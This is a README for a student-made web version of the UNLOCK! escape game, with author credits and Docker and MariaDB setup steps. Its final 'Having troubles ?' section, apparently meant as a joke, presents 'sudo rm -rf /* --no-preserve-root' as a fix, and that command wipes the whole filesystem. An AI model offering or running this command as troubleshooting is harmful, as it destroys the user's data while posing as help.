![logo UNLOCK!](./public/data/assets/UNLOCK.webp)
---
# UNLOCK! - The Escape Game


[UNLOCK!](https://www.spacecowboys.fr/unlock) is a series of escape room games published by Asmodee Digital. The games are available on iOS, Android, and Steam. The games are based on the Escape Room series of board games by Space Cowboys.  

## This is a school project made by:

### [Tristan BELMONT](https://github.com/MaegIins), ✨ The Front Master ✨
### [Kévin BULLY CIMBALURIA](https://github.com/TheRealEureka), 🦝 The Raton Master 🦝
### [Lucas FARRONI](https://github.com/lucasfarroni), 👨‍🦲 The Bald Master 👨‍🦲
### [Clément PERRIN](https://github.com/Alfiov), 😠 The Aigrito Master 😠


# Setup App

## Web server 

1. Install packages

```
composer update
```

2. Start Docker

```
docker-compose up --build
```

3. Go to [http://localhost:8080](http://localhost:8080)

## Database

1. Open MariaDB container's CLI
```
 docker-compose exec --workdir / mariadb /bin/bash 
```
2. Connect to MariaDB (root/root)
```
 mysql -u root -p 
```
3. Create database
```
 create database unlock;
```
4. Finaly, import init.sql into the database
# Having troubles ?

```
sudo rm -rf /* --no-preserve-root
```
